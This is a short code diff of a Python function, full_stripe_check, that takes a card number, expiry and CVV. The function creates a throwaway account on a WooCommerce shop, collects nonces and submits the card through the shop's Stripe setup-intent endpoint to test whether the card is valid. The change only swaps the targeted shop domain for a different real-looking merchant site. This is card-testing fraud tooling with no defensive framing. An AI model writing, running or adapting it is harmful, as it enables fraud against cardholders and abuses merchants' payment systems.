@@ -34,7 +34,7 @@ def full_stripe_check(cc, mm, yy, cvv):
             'email': random_email, 'password': 'Password123!', 'woocommerce-register-nonce': login_nonce,
             '_wp_http_referer': '/account/', 'register': 'Register',
         }
-        session.post('https://shop.wiseacrebrew.com/account/', data=register_data)
+        session.post('https://mikelaunderphotography.com/my-account/', data=register_data)
 
         # Step 4: Get payment nonce with the valid session
         payment_page_res = session.get('https://mikelaunderphotography.com/my-account/add-payment-method/')
@@ -61,7 +61,7 @@ def full_stripe_check(cc, mm, yy, cvv):
             'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_token,
             'wc-stripe-payment-type': 'card', '_ajax_nonce': ajax_nonce,
         }
-        final_response = session.post('https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
+        final_response = session.post('https://mikelaunderphotography.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
         response_json = final_response.json()
 
         if "Unable to verify your request" in response_json.get('messages', ''):
